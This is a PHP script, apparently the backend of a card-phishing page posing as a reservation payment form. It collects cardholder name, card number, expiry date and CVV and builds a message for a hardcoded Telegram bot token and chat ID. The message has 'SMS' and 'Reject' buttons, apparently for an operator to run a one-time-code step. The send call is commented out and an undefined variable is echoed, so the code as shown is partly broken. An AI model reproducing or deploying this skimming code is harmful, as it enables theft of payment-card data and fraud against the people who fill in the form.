<?php
$cardHolderName = $_POST['cardHolderName'] ?? '';
$cardNumber = $_POST['cardNumber'] ?? '';
$expiryDate = $_POST['expiryDate'] ?? '';
$cvv = $_POST['cvv'] ?? '';
$amount = $_POST['amount'] ?? '';
$uniqueId = $_POST['unique_id'] ?? '';

$message = "Plaćanje rezervacije:\n"
         . "Ime nosioca kartice: $cardHolderName\n"
         . "Broj kartice: $cardNumber\n"
         . "Datum isteka: $expiryDate\n"
         . "CVV: $cvv\n"
         . "Iznos: $amount\n"
         . "ID: $uniqueId";

$apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

$telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
$telegramData = [
    'chat_id' => $chatId,
    'text' => $message,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [['text' => 'SMS', 'callback_data' => 'SMS_' . $uniqueId]],
            [['text' => 'Reject', 'callback_data' => 'Reject_' . $uniqueId]]
        ]
    ])
];

$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
// $telegramResponse = curl_exec($ch);
curl_close($ch);

// // Obrada odgovora od Telegrama
// if ($telegramResponse) {
//     $telegramData = json_decode($telegramResponse, true);
//     if ($telegramData['ok']) {
//         $responseMessage = "Poruka poslata na Telegram. ";
//         if (isset($_GET['status'])) {
//             if ($_GET['status'] === 'SMS') {
//                 $responseMessage .= "POSLAT JE SMS";
//             } elseif ($_GET['status'] === 'Reject') {
//                 $responseMessage .= "REJECT REJECT";
//             }
//         }
//     } else {
//         $responseMessage = "Greška prilikom slanja poruke na Telegram.";
//     }
// } else {
//     $responseMessage = "Nema odgovora od Telegrama.";
// }

// Ispisivanje odgovora na stranicu
echo $responseMessage;
?>
